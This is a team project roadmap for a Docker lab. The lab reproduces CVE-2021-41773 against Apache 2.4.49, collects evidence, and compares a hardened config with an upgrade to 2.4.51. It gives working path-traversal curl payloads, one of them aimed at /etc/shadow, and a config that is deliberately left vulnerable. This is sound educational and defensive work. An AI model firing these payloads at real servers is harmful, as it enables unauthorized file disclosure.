# CVE-2021-41773 Project Roadmap
Team: Beth Magembe, Davis Tameh, Jacob Davey

---

## 🎯 Project Goal
Recreate and exploit CVE-2021-41773 (Apache HTTP Server 2.4.49 path traversal vulnerability), demonstrate file disclosure, and compare against a patched version.

---

## 📦 Current Status
✅ Docker environment builds  
✅ Apache 2.4.49 runs on port 8080  
✅ Basic web page accessible  

---

## 🚀 Phase 1 — Confirm Vulnerable Environment

### Tasks

1. **Verify Apache version inside container**
   ```bash
   docker build -t cve-2021-41773-lab ./cve-2021-41773
   docker run --rm -p 8080:8080 --name cve-lab cve-2021-41773-lab &
   docker exec -it cve-lab httpd -v
   ```
   Expected output: `Server version: Apache/2.4.49`

2. **Confirm lab is reachable on port 8080**
   ```bash
   curl -v http://localhost:8080/
   ```
   Expected: HTTP 200 with the starter lab HTML page.

3. **Confirm vulnerable Apache config is active**
   - Review `cve-2021-41773/httpd-lab.conf`: the `<Directory />` block intentionally sets `Require all granted` with no path-normalization hardening.
   - Verify the config is loaded inside the container:
     ```bash
     docker exec -it cve-lab cat /usr/local/apache2/conf/extra/httpd-lab.conf
     docker exec -it cve-lab grep -n "Include.*httpd-lab" /usr/local/apache2/conf/httpd.conf
     ```

4. **Record evidence**
   - Save `httpd -v` output to `exploit/evidence/phase1-version.txt`.
   - Save `curl` response headers to `exploit/evidence/phase1-curl.txt`.
   - Save config grep output to `exploit/evidence/phase1-config.txt`.

### Acceptance ✅
- [ ] Apache version confirmed as 2.4.49
- [ ] HTTP 200 response confirmed on port 8080
- [ ] Vulnerable config (`Require all granted` on `<Directory />`) confirmed active
- [ ] Evidence files committed to repo

---

## 🔓 Phase 2 — Vulnerability Reproduction

CVE-2021-41773 is a path traversal bug in Apache 2.4.49 caused by insufficient URL normalization. An attacker can use URL-encoded dot segments (e.g., `%2e%2e`) to escape the document root and read arbitrary files.

### Prerequisites
- Phase 1 complete and container running (`cve-2021-41773-lab`).
- Target file: `/opt/protected/protected.txt` (placed at `/opt/protected/` inside the container, outside the document root `htdocs/`).

### Test Cases

**Test 1 — Path traversal to read protected file**
```bash
curl "http://localhost:8080/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/opt/protected/protected.txt"
```
Expected (vulnerable): contents of `protected.txt` are returned.

**Test 2 — Alternative encoding variant**
```bash
curl "http://localhost:8080/icons/%2e%2e/%2e%2e/%2e%2e/%2e%2e/opt/protected/protected.txt"
```
Expected (vulnerable): same file contents returned.

**Test 3 — Attempt against a non-existent path (negative control)**
```bash
curl "http://localhost:8080/cgi-bin/%2e%2e/%2e%2e/etc/shadow"
```
Expected: file does not exist inside container; HTTP 404.

### Tasks
1. Enable `mod_cgi` or confirm an alias that allows traversal (the `<Directory />` config already grants traversal access).
2. Run each test case and capture full request + response:
   ```bash
   curl -v "http://localhost:8080/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/opt/protected/protected.txt" \
       2>&1 | tee exploit/evidence/phase2-traversal.txt
   ```
3. Document exact HTTP status codes, response bodies, and any error messages observed.
4. Note limitations (e.g., which path aliases are required, which encodings work).

### Record Evidence
- Save all curl outputs to `exploit/evidence/`.
- Add a short `exploit/README.md` update summarizing what worked and what did not.

### Acceptance ✅
- [ ] Path traversal successfully reads `/opt/protected/protected.txt` on the vulnerable image
- [ ] Both encoding variants tested and results documented
- [ ] Negative control confirms non-existent paths return 404
- [ ] All evidence files committed

---

## 🛡️ Phase 3 — Patch & Mitigation Comparison

### Overview
Compare the vulnerable Apache 2.4.49 behavior against two mitigations:
1. **Config-only patch** — harden `httpd-lab.conf` to deny access to the filesystem root.
2. **Version patch** — rebuild the image with Apache 2.4.51 (the official fix release).

### 3a — Config-Only Patch

1. Create `cve-2021-41773/patches/httpd-patched.conf` with hardened settings:
   ```apache
   <Directory />
       AllowOverride none
       Require all denied
   </Directory>
   <Directory /usr/local/apache2/htdocs>
       Require all granted
   </Directory>
   ```
2. Create `cve-2021-41773/patches/Dockerfile.patched` that uses the same `httpd:2.4.49` base but swaps in the patched config.
3. Build and run the patched image:
   ```bash
   docker build -t cve-2021-41773-patched -f cve-2021-41773/patches/Dockerfile.patched ./cve-2021-41773
   docker run --rm -p 8081:8080 cve-2021-41773-patched
   ```
4. Re-run Phase 2 test cases against port 8081 and capture responses.

### 3b — Version Patch

1. Create `cve-2021-41773/patches/Dockerfile.apache2451` that uses `httpd:2.4.51` base image.
2. Build and run:
   ```bash
   docker build -t cve-2021-41773-2451 -f cve-2021-41773/patches/Dockerfile.apache2451 ./cve-2021-41773
   docker run --rm -p 8082:8080 cve-2021-41773-2451
   ```
3. Re-run Phase 2 test cases against port 8082 and capture responses.

### Comparison Table (fill in after testing)

| Test Case | Vulnerable 2.4.49 | Config Patch | Version Patch (2.4.51) |
|---|---|---|---|
| Traversal Test 1 | ✅ File disclosed | ❌ Blocked (403) | ❌ Blocked (400/403) |
| Traversal Test 2 | ✅ File disclosed | ❌ Blocked (403) | ❌ Blocked (400/403) |
| Negative Control | 404 | 404 | 404 |

*(Update with actual observed status codes after running tests.)*

### Record Evidence
- Save patched curl outputs to `patches/evidence/`.
- Update `patches/README.md` with a summary of what each mitigation prevents and why.

### Acceptance ✅
- [ ] Config-only patched image built and tested
- [ ] Version-patched image (2.4.51) built and tested
- [ ] Comparison table filled with real observed results
- [ ] All patch files and evidence committed

---

## 📝 Phase 4 — Deliverables

### Tasks

1. **Final Write-Up** (`report/report.md` or equivalent)
   - Executive summary of CVE-2021-41773 (what it is, who it affects, CVSS score).
   - Lab setup: Docker environment, Apache version, config details.
   - Reproduction walkthrough: step-by-step with evidence screenshots/outputs.
   - Mitigation: config-only vs version upgrade, pros and cons.
   - Risk and impact analysis: what an attacker could achieve and at what scale.
   - Lessons learned and recommendations.

2. **Screenshots / Log Evidence**
   - Terminal screenshots of each phase (or captured text outputs committed to repo).
   - All evidence files organized under `exploit/evidence/` and `patches/evidence/`.

3. **Team Task Ownership**

   | Task | Owner | Status |
   |---|---|---|
   | Phase 1 — Environment verification | | ⬜ |
   | Phase 2 — Exploit reproduction | | ⬜ |
   | Phase 3 — Patch implementation | | ⬜ |
   | Phase 3 — Comparison documentation | | ⬜ |
   | Phase 4 — Final write-up | | ⬜ |
   | Phase 4 — Slides / presentation | | ⬜ |

4. **Presentation / Slides**
   - Overview of CVE, lab architecture, demo walkthrough, mitigation comparison, lessons learned.

### Acceptance ✅
- [ ] Final write-up committed to repo
- [ ] All evidence files organized and committed
- [ ] Team task ownership table filled in
- [ ] Presentation / slides ready

---

## ✅ Overall Acceptance Criteria

| Criterion | Done? |
|---|---|
| Vulnerable environment verified (Apache 2.4.49 + weak config) | ⬜ |
| Exploit reproduction demonstrated (path traversal reads protected file) | ⬜ |
| Patched environment blocks disclosure (config and/or version upgrade) | ⬜ |
| Comparison documented with reproducible step-by-step instructions | ⬜ |
| Evidence committed for all phases | ⬜ |
| Final report and presentation complete | ⬜ |
